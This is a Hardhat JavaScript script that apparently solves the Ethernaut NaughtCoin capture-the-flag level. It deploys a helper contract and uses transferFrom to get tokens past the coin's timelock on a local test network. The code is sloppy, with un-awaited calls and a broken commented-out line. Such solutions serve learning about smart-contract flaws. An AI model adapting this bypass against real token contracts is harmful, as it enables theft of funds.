const { ethers } = require("hardhat");
const { subtask } = require("hardhat/config");

async function main () {
    const useraddr = "0x70997970C51812dc3A010C7d01b50e0d17dc79C8";
    const instanceaddr = "0x6F1216D1BFe15c98520CA1434FC1d9D57AC95321";
    const signer = await ethers.getSigner(useraddr);
    const _Nacontract = await ethers.getContractAt(
        "NaughtCoin",
        instanceaddr,
        signer
    );

/*    recv = await contract.approve(instanceaddr, 1024);
    recv.wait();
    
    recv = await contract.allowance(useraddr, instanceaddr);
    console.log(recv);

    recv = await contract.transferFrom(useraddr, , 1);
*/

    const _Attackcontract = await ethers.getContractFactory("Transfer");
    const _Attackdeploy = await _Attackcontract.deploy(instanceaddr);
    const _address = _Attackdeploy.target;
    const attack = await ethers.getContractAt(
        "Transfer",
        _address,
        signer
    );

    let recv = await attack.attack(useraddr, _address);
    recv.wait();
    recv = await attack.value();
    var value = recv;
    console.log(value);
    recv = _Nacontract.transferFrom(useraddr, instanceaddr, value);
    recv = await _Nacontract.balanceOf(useraddr);
    console.log(recv);

}

main().catch((error => {
    console.log(error);
    process.exit(1);
}))
